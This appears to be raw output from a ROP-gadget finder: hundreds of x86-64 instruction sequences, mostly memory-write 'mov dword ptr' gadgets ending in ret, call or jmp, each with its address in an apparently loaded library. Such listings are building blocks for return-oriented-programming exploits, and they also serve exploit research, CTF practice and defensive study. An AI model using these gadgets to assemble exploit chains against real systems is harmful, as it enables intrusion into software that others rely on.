0x00002aaaaab72e00 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 4], r8d ; mov rax, rdi ; ret
0x00002aaaaab7b847 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 7], edx ; lea rax, qword ptr [rdi + 0xa] ; ret
0x00002aaaaab7c687 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 7], edx ; lea rax, qword ptr [rdi + 0xb] ; ret
0x00002aaaaab7a227 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 7], edx ; ret
0x00002aaaaab7e0f7 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 7], edx ; xor ch, ch ; mov byte ptr [rdi + 0xb], ch ; ret
0x00002aaaaab7b867 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 8], edx ; lea rax, qword ptr [rdi + 0xb] ; ret
0x00002aaaaab7c6a7 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 8], edx ; lea rax, qword ptr [rdi + 0xc] ; ret
0x00002aaaaab7a237 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 8], edx ; ret
0x00002aaaaab7e117 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 8], edx ; xor ch, ch ; mov byte ptr [rdi + 0xc], ch ; ret
0x00002aaaaab63763 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + rdx - 4], ecx ; ret
0x00002aaaaab7ea47 : mov dword ptr [rdi], ecx ; mov dword ptr [rsi - 4], ecx ; ret
0x00002aaaaab7b888 : mov dword ptr [rdi], ecx ; mov qword ptr [rdi + 5], rdx ; lea rax, qword ptr [rdi + 0xc] ; ret
0x00002aaaaab7c6c8 : mov dword ptr [rdi], ecx ; mov qword ptr [rdi + 5], rdx ; lea rax, qword ptr [rdi + 0xd] ; ret
0x00002aaaaab7a248 : mov dword ptr [rdi], ecx ; mov qword ptr [rdi + 5], rdx ; ret
0x00002aaaaab7e138 : mov dword ptr [rdi], ecx ; mov qword ptr [rdi + 5], rdx ; xor ch, ch ; mov byte ptr [rdi + 0xd], ch ; ret
0x00002aaaaab7b8a8 : mov dword ptr [rdi], ecx ; mov qword ptr [rdi + 6], rdx ; lea rax, qword ptr [rdi + 0xd] ; ret
0x00002aaaaab7c6e8 : mov dword ptr [rdi], ecx ; mov qword ptr [rdi + 6], rdx ; lea rax, qword ptr [rdi + 0xe] ; ret
0x00002aaaaab7a258 : mov dword ptr [rdi], ecx ; mov qword ptr [rdi + 6], rdx ; ret
0x00002aaaaab7e158 : mov dword ptr [rdi], ecx ; mov qword ptr [rdi + 6], rdx ; xor ch, ch ; mov byte ptr [rdi + 0xe], ch ; ret
0x00002aaaaab7b8c8 : mov dword ptr [rdi], ecx ; mov qword ptr [rdi + 7], rdx ; lea rax, qword ptr [rdi + 0xe] ; ret
0x00002aaaaab7c708 : mov dword ptr [rdi], ecx ; mov qword ptr [rdi + 7], rdx ; lea rax, qword ptr [rdi + 0xf] ; ret
0x00002aaaaab7a268 : mov dword ptr [rdi], ecx ; mov qword ptr [rdi + 7], rdx ; ret
0x00002aaaaab7e178 : mov dword ptr [rdi], ecx ; mov qword ptr [rdi + 7], rdx ; xor ch, ch ; mov byte ptr [rdi + 0xf], ch ; ret
0x00002aaaaab6376b : mov dword ptr [rdi], ecx ; mov qword ptr [rdi + rdx - 8], rcx ; ret
0x00002aaaaab72e40 : mov dword ptr [rdi], ecx ; mov rax, rdi ; ret
0x00002aaaaab72ef0 : mov dword ptr [rdi], ecx ; mov word ptr [rdi + 4], dx ; lea rax, qword ptr [rdi + 5] ; ret
0x00002aaaaab7c606 : mov dword ptr [rdi], ecx ; mov word ptr [rdi + 4], dx ; lea rax, qword ptr [rdi + 6] ; ret
0x00002aaaaab72df0 : mov dword ptr [rdi], ecx ; mov word ptr [rdi + 4], dx ; mov rax, rdi ; ret
0x00002aaaaab7a1d6 : mov dword ptr [rdi], ecx ; mov word ptr [rdi + 4], dx ; ret
0x00002aaaaab7e076 : mov dword ptr [rdi], ecx ; mov word ptr [rdi + 4], dx ; xor ch, ch ; mov byte ptr [rdi + 6], ch ; ret
0x00002aaaaab7c668 : mov dword ptr [rdi], ecx ; mov word ptr [rdi + 8], dx ; lea rax, qword ptr [rdi + 0xa] ; ret
0x00002aaaaab7b828 : mov dword ptr [rdi], ecx ; mov word ptr [rdi + 8], dx ; lea rax, qword ptr [rdi + 9] ; ret
0x00002aaaaab7a218 : mov dword ptr [rdi], ecx ; mov word ptr [rdi + 8], dx ; ret
0x00002aaaaab7e0d8 : mov dword ptr [rdi], ecx ; mov word ptr [rdi + 8], dx ; xor ch, ch ; mov byte ptr [rdi + 0xa], ch ; ret
0x00002aaaaab7ea53 : mov dword ptr [rdi], ecx ; mov word ptr [rsi - 2], cx ; ret
0x00002aaaaab68ee7 : mov dword ptr [rdi], ecx ; pop rbx ; ret
0x00002aaaaaaf49c3 : mov dword ptr [rdi], ecx ; ret
0x00002aaaaab7b794 : mov dword ptr [rdi], edx ; lea rax, qword ptr [rdi + 1] ; ret
0x00002aaaaab7c5b4 : mov dword ptr [rdi], edx ; lea rax, qword ptr [rdi + 2] ; ret
0x00002aaaaab7b7b2 : mov dword ptr [rdi], edx ; lea rax, qword ptr [rdi + 3] ; ret
0x00002aaaaab7c5e2 : mov dword ptr [rdi], edx ; lea rax, qword ptr [rdi + 4] ; ret
0x00002aaaaab7b804 : mov dword ptr [rdi], edx ; lea rax, qword ptr [rdi + 7] ; ret
0x00002aaaaab7c634 : mov dword ptr [rdi], edx ; lea rax, qword ptr [rdi + 8] ; ret
0x00002aaaaab7b190 : mov dword ptr [rdi], edx ; mov byte ptr [rdi + 4], dl ; ret
0x00002aaaaab7b1d1 : mov dword ptr [rdi], edx ; mov byte ptr [rdi + 8], dl ; ret
0x00002aaaaab7b1f1 : mov dword ptr [rdi], edx ; mov dword ptr [rdi + 7], edx ; ret
0x00002aaaaab7b201 : mov dword ptr [rdi], edx ; mov dword ptr [rdi + 8], edx ; ret
0x00002aaaaab7b211 : mov dword ptr [rdi], edx ; mov qword ptr [rdi + 5], rdx ; ret
0x00002aaaaab7b221 : mov dword ptr [rdi], edx ; mov qword ptr [rdi + 6], rdx ; ret
0x00002aaaaab7b1a0 : mov dword ptr [rdi], edx ; mov word ptr [rdi + 4], dx ; ret
0x00002aaaaab7b1e1 : mov dword ptr [rdi], edx ; mov word ptr [rdi + 8], dx ; ret
0x00002aaaaab09dd6 : mov dword ptr [rdi], edx ; ret
0x00002aaaaab7e024 : mov dword ptr [rdi], edx ; xor ch, ch ; mov byte ptr [rdi + 2], ch ; ret
0x00002aaaaab7e052 : mov dword ptr [rdi], edx ; xor ch, ch ; mov byte ptr [rdi + 4], ch ; ret
0x00002aaaaab7e0a4 : mov dword ptr [rdi], edx ; xor ch, ch ; mov byte ptr [rdi + 8], ch ; ret
0x00002aaaaac489c3 : mov dword ptr [rdi], esi ; and eax, 0xff834800 ; add dword ptr [rdi + 3], esi ; ret
0x00002aaaaab0a0c9 : mov dword ptr [rdi], esi ; fld xword ptr [rsp - 0x18] ; ret
0x00002aaaaab72eb1 : mov dword ptr [rdi], esi ; lea rax, qword ptr [rdi + 1] ; ret
0x00002aaaaab72ec1 : mov dword ptr [rdi], esi ; mov byte ptr [rdi + 2], 0 ; lea rax, qword ptr [rdi + 2] ; ret
0x00002aaaaab72e31 : mov dword ptr [rdi], esi ; mov byte ptr [rdi + 2], 0 ; mov rax, rdi ; ret
0x00002aaaaab73fef : mov dword ptr [rdi], esi ; mov dword ptr [r9 - 4], ecx ; ret
0x00002aaaaac21f6b : mov dword ptr [rdi], esi ; mov dword ptr [rdi + rdx - 4], ecx ; ret
0x00002aaaaab1f07d : mov dword ptr [rdi], esi ; mov dword ptr [rdx], eax ; mov eax, 1 ; ret
0x00002aaaaab73fde : mov dword ptr [rdi], esi ; mov qword ptr [r9 - 8], rcx ; ret
0x00002aaaaac21f4e : mov dword ptr [rdi], esi ; mov qword ptr [rdi + rdx - 8], rcx ; ret
0x00002aaaaab72e21 : mov dword ptr [rdi], esi ; mov rax, rdi ; ret
0x00002aaaaab74003 : mov dword ptr [rdi], esi ; mov word ptr [r9 - 2], cx ; ret
0x00002aaaaac21f80 : mov dword ptr [rdi], esi ; mov word ptr [rdi + rdx - 2], cx ; ret
0x00002aaaaab29cb4 : mov dword ptr [rdi], esi ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab1f0a3 : mov dword ptr [rdi], esi ; ret
0x00002aaaaabca371 : mov dword ptr [rdi], esi ; xor eax, eax ; ret
0x00002aaaaab72d71 : mov dword ptr [rdi], r9d ; add rdi, 2 ; mov rax, rdi ; ret
0x00002aaaaac09dec : mov dword ptr [rdx + 0x10], eax ; mov eax, 1 ; ret
0x00002aaaaab42cb7 : mov dword ptr [rdx + 0x130], ecx ; ret
0x00002aaaaab4d4b5 : mov dword ptr [rdx + 0x130], edi ; pop rbx ; ret
0x00002aaaaab691af : mov dword ptr [rdx + 0x18], eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab460ce : mov dword ptr [rdx + 0x20], eax ; mov dword ptr [rcx], edi ; mov eax, edi ; ret
0x00002aaaaab46274 : mov dword ptr [rdx + 0x20], esi ; mov dword ptr [rcx], eax ; ret
0x00002aaaaac02c00 : mov dword ptr [rdx + 0x20], esi ; ret
0x00002aaaaabfbac7 : mov dword ptr [rdx + 0x210], 0xffffffff ; ret
0x00002aaaaac02bdc : mov dword ptr [rdx + 0x58], edi ; mov qword ptr [rdx + 0x68], rcx ; ret
0x00002aaaaac02be0 : mov dword ptr [rdx + 0x68], ecx ; ret
0x00002aaaaac067c0 : mov dword ptr [rdx + 0x6c], eax ; mov eax, 1 ; ret
0x00002aaaaac09ccc : mov dword ptr [rdx + 0xc], eax ; mov eax, 1 ; ret
0x00002aaaaab8fa90 : mov dword ptr [rdx + 0xc], edi ; pop rbp ; pop r12 ; pop r14 ; ret
0x00002aaaaac3f487 : mov dword ptr [rdx + 3], eax ; lea rax, qword ptr [rdx + 6] ; ret
0x00002aaaaab76f6c : mov dword ptr [rdx + 3], eax ; mov rax, rdi ; ret
0x00002aaaaac3f469 : mov dword ptr [rdx + 4], eax ; lea rax, qword ptr [rdx + 5] ; ret
0x00002aaaaab76f4e : mov dword ptr [rdx + 4], eax ; mov rax, rdi ; ret
0x00002aaaaac3f51b : mov dword ptr [rdx + 5], eax ; lea rax, qword ptr [rdx + 0xc] ; ret
0x00002aaaaac3f499 : mov dword ptr [rdx + 5], eax ; lea rax, qword ptr [rdx + 8] ; ret
0x00002aaaaac3b149 : mov dword ptr [rdx + 5], eax ; mov rax, rdi ; ret
0x00002aaaaac3f53b : mov dword ptr [rdx + 6], eax ; lea rax, qword ptr [rdx + 0xd] ; ret
0x00002aaaaac3f4b9 : mov dword ptr [rdx + 6], eax ; lea rax, qword ptr [rdx + 9] ; ret
0x00002aaaaac3b159 : mov dword ptr [rdx + 6], eax ; mov rax, rdi ; ret
0x00002aaaaac3f4d9 : mov dword ptr [rdx + 7], eax ; lea rax, qword ptr [rdx + 0xa] ; ret
0x00002aaaaac3f55b : mov dword ptr [rdx + 7], eax ; lea rax, qword ptr [rdx + 0xe] ; ret
0x00002aaaaab76ff0 : mov dword ptr [rdx + 7], eax ; mov rax, rdi ; ret
0x00002aaaaab40414 : mov dword ptr [rdx + 8], eax ; add dword ptr [rdx + 4], 1 ; ret
0x00002aaaaac3f4f9 : mov dword ptr [rdx + 8], eax ; lea rax, qword ptr [rdx + 0xb] ; ret
0x00002aaaaac3f3eb : mov dword ptr [rdx + 8], eax ; lea rax, qword ptr [rdx + 0xf] ; ret
0x00002aaaaab76fd2 : mov dword ptr [rdx + 8], eax ; mov rax, rdi ; ret
0x00002aaaaac06741 : mov dword ptr [rdx + 8], edi ; ret
0x00002aaaaac156df : mov dword ptr [rdx], 0 ; mov eax, 0xffffffff ; ret
0x00002aaaaab1f0b0 : mov dword ptr [rdx], 0 ; mov eax, 1 ; ret
0x00002aaaaab43574 : mov dword ptr [rdx], 5 ; pop rbx ; ret
0x00002aaaaabd0b2f : mov dword ptr [rdx], eax ; add rsp, 0x30 ; mov eax, ebx ; pop rbx ; ret
0x00002aaaaac3f414 : mov dword ptr [rdx], eax ; lea rax, qword ptr [rdx + 1] ; ret
0x00002aaaaac3f442 : mov dword ptr [rdx], eax ; lea rax, qword ptr [rdx + 3] ; ret
0x00002aaaaac3f394 : mov dword ptr [rdx], eax ; lea rax, qword ptr [rdx + 7] ; ret
0x00002aaaaab76ef9 : mov dword ptr [rdx], eax ; mov al, byte ptr [rcx + 2] ; mov byte ptr [rdx + 2], al ; mov rax, rdi ; ret
0x00002aaaaab76f27 : mov dword ptr [rdx], eax ; mov al, byte ptr [rcx + 4] ; mov byte ptr [rdx + 4], al ; mov rax, rdi ; ret
0x00002aaaaabcaf28 : mov dword ptr [rdx], eax ; mov eax, 0xffffffff ; add rsp, 0x18 ; ret
0x00002aaaaab4d961 : mov dword ptr [rdx], eax ; mov eax, 0xffffffff ; pop rbx ; ret
0x00002aaaaab0a45a : mov dword ptr [rdx], eax ; mov eax, 0xffffffff ; ret
0x00002aaaaab1f07f : mov dword ptr [rdx], eax ; mov eax, 1 ; ret
0x00002aaaaab76f67 : mov dword ptr [rdx], eax ; mov eax, dword ptr [rcx + 3] ; mov dword ptr [rdx + 3], eax ; mov rax, rdi ; ret
0x00002aaaaac3b144 : mov dword ptr [rdx], eax ; mov eax, dword ptr [rcx + 5] ; mov dword ptr [rdx + 5], eax ; mov rax, rdi ; ret
0x00002aaaaac3b154 : mov dword ptr [rdx], eax ; mov eax, dword ptr [rcx + 6] ; mov dword ptr [rdx + 6], eax ; mov rax, rdi ; ret
0x00002aaaaac3b164 : mov dword ptr [rdx], eax ; mov eax, dword ptr [rcx + 7] ; mov dword ptr [rdx + 7], eax ; mov rax, rdi ; ret
0x00002aaaaac3b174 : mov dword ptr [rdx], eax ; mov eax, dword ptr [rcx + 8] ; mov dword ptr [rdx + 8], eax ; mov rax, rdi ; ret
0x00002aaaaab9e3cd : mov dword ptr [rdx], eax ; mov eax, esi ; add rsp, 0x48 ; ret
0x00002aaaaab4e1c0 : mov dword ptr [rdx], eax ; mov rax, -1 ; ret
0x00002aaaaab76ee9 : mov dword ptr [rdx], eax ; mov rax, rdi ; ret
0x00002aaaaab9dbb2 : mov dword ptr [rdx], eax ; mov rax, rsi ; add rsp, 8 ; ret
0x00002aaaaab0319d : mov dword ptr [rdx], eax ; ret
0x00002aaaaab4b2df : mov dword ptr [rdx], eax ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab9427f : mov dword ptr [rdx], eax ; xor edx, edx ; add rsp, 8 ; mov rax, rdx ; ret
0x00002aaaaabf3c2f : mov dword ptr [rdx], ebp ; add byte ptr [rax - 0x7d], cl ; ret 0xe801
0x00002aaaaab4543a : mov dword ptr [rdx], ebx ; add rsp, 8 ; mov eax, ebx ; pop rbx ; pop rbp ; ret
0x00002aaaaab7f265 : mov dword ptr [rdx], ecx ; jne 0xaa25d ; ret
0x00002aaaaab46f86 : mov dword ptr [rdx], ecx ; mov edx, dword ptr [rax] ; mov eax, edx ; pop rbx ; ret
0x00002aaaaabbeab7 : mov dword ptr [rdx], ecx ; pop rdx ; pop rcx ; pop rbx ; ret
0x00002aaaaab73175 : mov dword ptr [rdx], ecx ; ret
0x00002aaaaaaf492b : mov dword ptr [rdx], edi ; add byte ptr [rax + 0x5b], bl ; pop rbp ; ret
0x00002aaaaabbbf1b : mov dword ptr [rdx], edi ; ret
0x00002aaaaab9e223 : mov dword ptr [rdx], esi ; add rsp, 0x18 ; ret
0x00002aaaaab9e2ed : mov dword ptr [rdx], esi ; add rsp, 8 ; ret
0x00002aaaaac0673e : mov dword ptr [rdx], esi ; mov qword ptr [rdx + 8], rdi ; ret
0x00002aaaaab693d7 : mov dword ptr [rdx], esp ; mov rax, r11 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab9e3cc : mov dword ptr [rdx], r8d ; mov eax, esi ; add rsp, 0x48 ; ret
0x00002aaaaab9dbb1 : mov dword ptr [rdx], r8d ; mov rax, rsi ; add rsp, 8 ; ret
0x00002aaaaac4872f : mov dword ptr [rip + 0x25200b], ebx ; jne 0x173721 ; pop rbx ; ret
0x00002aaaaac48804 : mov dword ptr [rip + 0x252242], 0 ; pop rbx ; ret
0x00002aaaaac489b2 : mov dword ptr [rip + 0x25375c], 0 ; ret
0x00002aaaaac16082 : mov dword ptr [rip + 0x282284], 0xffffffff ; ret
0x00002aaaaac15186 : mov dword ptr [rip + 0x284284], edx ; add rsp, 8 ; ret
0x00002aaaaac009c9 : mov dword ptr [rip + 0x29c3ed], eax ; add rsp, 8 ; ret
0x00002aaaaabf4a9f : mov dword ptr [rip + 0x2a4dbb], eax ; add rsp, 8 ; ret
0x00002aaaaabe9ef8 : mov dword ptr [rip + 0x2b2222], eax ; pop rbp ; ret
0x00002aaaaabe960e : mov dword ptr [rip + 0x2b4118], 1 ; pop rbx ; ret
0x00002aaaaabdda3f : mov dword ptr [rip + 0x2ba7f7], 2 ; pop rbp ; ret
0x00002aaaaabdda32 : mov dword ptr [rip + 0x2ba804], 0 ; pop rbp ; ret
0x00002aaaaabdd970 : mov dword ptr [rip + 0x2ba8ca], ebx ; pop rbx ; ret
0x00002aaaaabd58ba : mov dword ptr [rip + 0x2c2950], edi ; ret
0x00002aaaaabd2905 : mov dword ptr [rip + 0x2c6e95], eax ; mov rdx, rax ; jmp 0xfd8a7
0x00002aaaaabd286f : mov dword ptr [rip + 0x2c6f2b], eax ; add rsp, 8 ; ret
0x00002aaaaabd3efa : mov dword ptr [rip + 0x2c71f0], eax ; add rsp, 8 ; ret
0x00002aaaaabd3e6d : mov dword ptr [rip + 0x2c727d], edx ; add rsp, 8 ; ret
0x00002aaaaab61c26 : mov dword ptr [rip + 0x338c5c], eax ; add rsp, 8 ; ret
0x00002aaaaab5cb54 : mov dword ptr [rip + 0x33dca6], 1 ; pop rbx ; ret
0x00002aaaaab5caf0 : mov dword ptr [rip + 0x33dd22], edx ; add rsp, 0x18 ; ret
0x00002aaaaab58570 : mov dword ptr [rip + 0x34224e], 0 ; ret
0x00002aaaaab584f6 : mov dword ptr [rip + 0x3422e0], 0 ; ret
0x00002aaaaab51c15 : mov dword ptr [rip + 0x348b49], 0 ; ret
0x00002aaaaab0b8bb : mov dword ptr [rip + 0x38c7cb], eax ; mov eax, edx ; ret
0x00002aaaaab0b8ac : mov dword ptr [rip + 0x38c7d6], edx ; ret
0x00002aaaaaaf4928 : mov dword ptr [rip + 0x3a89da], edx ; pop rax ; pop rbx ; pop rbp ; ret
0x00002aaaaabbccc4 : mov dword ptr [rsi + 0x10], eax ; ret
0x00002aaaaab10296 : mov dword ptr [rsi + 0x10], eax ; xor eax, eax ; ret
0x00002aaaaab0fc00 : mov dword ptr [rsi + 0x10], ecx ; mov qword ptr [rsi + 0x28], rax ; xor eax, eax ; ret
0x00002aaaaab0fc04 : mov dword ptr [rsi + 0x28], eax ; xor eax, eax ; ret
0x00002aaaaab4cf36 : mov dword ptr [rsi + 0x28], ecx ; mov byte ptr [rdx], dil ; ret
0x00002aaaaabd05e7 : mov dword ptr [rsi + 0x48], eax ; ret
0x00002aaaaabcf9b6 : mov dword ptr [rsi + 0x66], edx ; xor eax, eax ; ret
0x00002aaaaabca2af : mov dword ptr [rsi + 0x78], eax ; xor eax, eax ; ret
0x00002aaaaab102e0 : mov dword ptr [rsi + 0xc], eax ; xor eax, eax ; ret
0x00002aaaaab10327 : mov dword ptr [rsi + 0xe], eax ; xor eax, eax ; ret
0x00002aaaaab804e8 : mov dword ptr [rsi + 4], 0 ; ret
0x00002aaaaac01dc7 : mov dword ptr [rsi + 8], 0 ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaabbcca7 : mov dword ptr [rsi + 8], 0 ; ret
0x00002aaaaac01d17 : mov dword ptr [rsi + 8], 1 ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaac01d33 : mov dword ptr [rsi + 8], eax ; mov rax, qword ptr [rdi + 0x28] ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaac01d6b : mov dword ptr [rsi + 8], eax ; mov rax, qword ptr [rdi + 0x40] ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaac01ce1 : mov dword ptr [rsi + 8], eax ; ret
0x00002aaaaabbccc0 : mov dword ptr [rsi + 8], ecx ; mov qword ptr [rsi + 0x10], r8 ; ret
0x00002aaaaac093c0 : mov dword ptr [rsi + 8], edx ; mov rax, qword ptr [rax + 0x40] ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaac09c60 : mov dword ptr [rsi + 8], edx ; mov rax, qword ptr [rax + 0x50] ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaab1d034 : mov dword ptr [rsi + rax*8], edx ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabf8544 : mov dword ptr [rsi + rbx + 0x10], edx ; xor eax, eax ; mov byte ptr [rsi + 3], r11b ; pop rbx ; ret
0x00002aaaaab8f6a1 : mov dword ptr [rsi + rcx], edx ; jne 0xba69e ; ret
0x00002aaaaab7ea56 : mov dword ptr [rsi - 2], ecx ; ret
0x00002aaaaab7ea49 : mov dword ptr [rsi - 4], ecx ; ret
0x00002aaaaac01cff : mov dword ptr [rsi], 0 ; ret
0x00002aaaaac01ce8 : mov dword ptr [rsi], 0x10 ; mov qword ptr [rsi + 8], rax ; ret
0x00002aaaaab72d33 : mov dword ptr [rsi], 0x48fa4789 ; mov eax, edi ; ret
0x00002aaaaac01d90 : mov dword ptr [rsi], 0xa ; ret
0x00002aaaaac01d80 : mov dword ptr [rsi], 0xb ; ret
0x00002aaaaac01db0 : mov dword ptr [rsi], 0xc ; ret
0x00002aaaaac01da0 : mov dword ptr [rsi], 8 ; ret
0x00002aaaaab938f8 : mov dword ptr [rsi], eax ; mov rdi, rbx ; call 0x8ab77
0x00002aaaaab4c83b : mov dword ptr [rsi], eax ; xor eax, eax ; ret
0x00002aaaaab3aac8 : mov dword ptr [rsi], ebp ; jmp 0x64bf9
0x00002aaaaabc85d1 : mov dword ptr [rsi], ebx ; call 0x1f8ac
0x00002aaaaab0038d : mov dword ptr [rsi], ecx ; mov rcx, qword ptr [rax + r15*8] ; test rcx, rcx ; je 0x2b3a5 ; call rcx
0x00002aaaaabf79cf : mov dword ptr [rsi], ecx ; xor eax, eax ; ret
0x00002aaaaabf7463 : mov dword ptr [rsi], edi ; ret
0x00002aaaaabed771 : mov dword ptr [rsi], edi ; xor eax, eax ; ret
0x00002aaaaabbccbd : mov dword ptr [rsi], edx ; mov qword ptr [rsi + 8], rcx ; mov qword ptr [rsi + 0x10], r8 ; ret
0x00002aaaaab0fcb6 : mov dword ptr [rsi], edx ; ret
0x00002aaaaab56148 : mov dword ptr [rsp + 0x10], eax ; call rdi
0x00002aaaaab09f35 : mov dword ptr [rsp + 0x10], eax ; fld xword ptr [rsp + 8] ; ret
0x00002aaaaab56031 : mov dword ptr [rsp + 0x10], eax ; xor edi, edi ; call qword ptr [rax]
0x00002aaaaab53c47 : mov dword ptr [rsp + 0x14], eax ; pop r12 ; ret
0x00002aaaaab56143 : mov dword ptr [rsp + 0x18], eax ; mov qword ptr [rsp + 0x10], r8 ; call rdi
0x00002aaaaabb85ce : mov dword ptr [rsp + 0x18], edx ; call 0x1f8a6
0x00002aaaaac00c07 : mov dword ptr [rsp + 0x18], edx ; lea r9, qword ptr [rsp + 0x2c] ; call qword ptr [rax]
0x00002aaaaac003b8 : mov dword ptr [rsp + 0x20], eax ; mov qword ptr [rsp + 0x28], r9 ; call 0x13764b
0x00002aaaaab55d0f : mov dword ptr [rsp + 0x20], edx ; call qword ptr [rax]
0x00002aaaaab5608b : mov dword ptr [rsp + 0x20], edx ; call rax
0x00002aaaaab56086 : mov dword ptr [rsp + 0x28], eax ; mov qword ptr [rsp + 0x20], r10 ; call rax
0x00002aaaaac003bd : mov dword ptr [rsp + 0x28], ecx ; call 0x137646
0x00002aaaaab085d9 : mov dword ptr [rsp + 0x28], ecx ; call 0x1f8a6
0x00002aaaaab085d4 : mov dword ptr [rsp + 0x38], edx ; mov qword ptr [rsp + 0x28], rcx ; call 0x1f8ab
0x00002aaaaabc850b : mov dword ptr [rsp + 0x40], eax ; call 0x1f7f6
0x00002aaaaabfbebf : mov dword ptr [rsp + 0x40], ebp ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabb60b8 : mov dword ptr [rsp + 0x40], edi ; add rax, rdx ; jmp rax
0x00002aaaaab90658 : mov dword ptr [rsp + 0xb8], esi ; call r12
0x00002aaaaab3fa53 : mov dword ptr [rsp + 0xc], edx ; call 0xf6d06
0x00002aaaaab5d670 : mov dword ptr [rsp + 8], eax ; call qword ptr [rdx]
0x00002aaaaabd7156 : mov dword ptr [rsp + 8], eax ; call rbx
0x00002aaaaac0f8bd : mov dword ptr [rsp + 8], eax ; lea rsi, qword ptr [rsp + 0x18] ; call qword ptr [rax]
0x00002aaaaac106fc : mov dword ptr [rsp + 8], eax ; xor eax, eax ; call rdx
0x00002aaaaaaf4bff : mov dword ptr [rsp + 8], edx ; mov eax, dword ptr [rbx + 4] ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabecaa8 : mov dword ptr [rsp + rax*4], 0 ; mov edx, dword ptr [rbx] ; jmp 0x117a7f
0x00002aaaaab0a025 : mov dword ptr [rsp - 0x10], eax ; fld xword ptr [rsp - 0x18] ; fstp xword ptr [rdi] ; ret
0x00002aaaaab0a003 : mov dword ptr [rsp - 0x10], eax ; fld xword ptr [rsp - 0x18] ; ret
0x00002aaaaab0a0c5 : mov dword ptr [rsp - 0x10], eax ; mov dword ptr [rdi], esi ; fld xword ptr [rsp - 0x18] ; ret
0x00002aaaaab1f216 : mov dword ptr [rsp - 0x14], eax ; fld xword ptr [rsp - 0x18] ; ret
0x00002aaaaab0a1a5 : mov dword ptr [rsp - 2], edi ; fldcw word ptr [rsp - 2] ; ret
0x00002aaaaab1f189 : mov dword ptr [rsp - 4], edx ; movss xmm0, dword ptr [rsp - 4] ; ret
0x00002aaaaab1f1cf : mov dword ptr [rsp - 8], edx ; movsd xmm0, qword ptr [rsp - 8] ; ret
0x00002aaaaab6b12f : mov dword ptr [rsp], 0 ; pop rbp ; pop r12 ; ret
0x00002aaaaab93634 : mov dword ptr [rsp], 1 ; jmp 0xbe607
0x00002aaaaac0ed89 : mov dword ptr [rsp], 2 ; mov rdi, rsp ; call rdx
0x00002aaaaab5d9e0 : mov dword ptr [rsp], eax ; call qword ptr [rdx]
0x00002aaaaabc4102 : mov dword ptr [rsp], eax ; je 0xef0e6 ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab80ac2 : mov dword ptr [rsp], eax ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabfe923 : mov dword ptr [rsp], ecx ; call r12
0x00002aaaaabdb821 : mov dword ptr fs:[0x2d0], eax ; pop rax ; pop rdi ; call rax
0x00002aaaaaba1673 : mov dword ptr fs:[0x2d0], eax ; ret
0x00002aaaaabd1717 : mov dword ptr fs:[rax], 0x16 ; mov eax, edi ; ret
0x00002aaaaabd69f7 : mov dword ptr fs:[rax], 0x16 ; ret
0x00002aaaaab8fb8f : mov dword ptr fs:[rax], 0x16 ; xor eax, eax ; ret
0x00002aaaaab09b1b : mov dword ptr fs:[rax], 0x22 ; add rsp, 0x28 ; ret
0x00002aaaaab0a173 : mov dword ptr fs:[rax], 0x22 ; add rsp, 8 ; ret
0x00002aaaaab08e9f : mov dword ptr fs:[rax], 0x2a ; mov rax, rcx ; ret
0x00002aaaaab56b39 : mov dword ptr fs:[rax], 0xc ; mov rax, rcx ; ret
0x00002aaaaab57337 : mov dword ptr fs:[rax], 0xc ; xor eax, eax ; ret
0x00002aaaaab9c527 : mov dword ptr fs:[rax], 2 ; xor eax, eax ; ret
0x00002aaaaaaf6227 : mov dword ptr fs:[rax], 9 ; mov eax, edi ; ret
0x00002aaaaab34b87 : mov dword ptr fs:[rax], edi ; jmp 0x5fb52
0x00002aaaaab37806 : mov dword ptr fs:[rax], edi ; jmp 0x627d1
0x00002aaaaabd3610 : mov dword ptr fs:[rax], edi ; mov eax, 0xffffffff ; ret
0x00002aaaaabbedb9 : mov dword ptr fs:[rax], edx ; mov eax, 0xffffffff ; ret
0x00002aaaaabbed62 : mov dword ptr fs:[rax], r8d ; mov eax, 0xffffffff ; ret
0x00002aaaaabf6280 : mov dword ptr fs:[rbp], r12d ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaaba06ae : mov dword ptr fs:[rbx], ebp ; add rsp, 0x18 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac17048 : mov dword ptr fs:[rbx], ebp ; xor eax, eax ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaab3545b : mov dword ptr fs:[rcx], eax ; jmp 0x60426
0x00002aaaaab0a779 : mov dword ptr fs:[rcx], eax ; or rax, 0xffffffffffffffff ; ret
0x00002aaaaab43573 : mov dword ptr fs:[rdx], 5 ; pop rbx ; ret
0x00002aaaaabd0b2e : mov dword ptr fs:[rdx], eax ; add rsp, 0x30 ; mov eax, ebx ; pop rbx ; ret
0x00002aaaaab4d960 : mov dword ptr fs:[rdx], eax ; mov eax, 0xffffffff ; pop rbx ; ret
0x00002aaaaab0a459 : mov dword ptr fs:[rdx], eax ; mov eax, 0xffffffff ; ret
0x00002aaaaab4e1bf : mov dword ptr fs:[rdx], eax ; mov rax, -1 ; ret
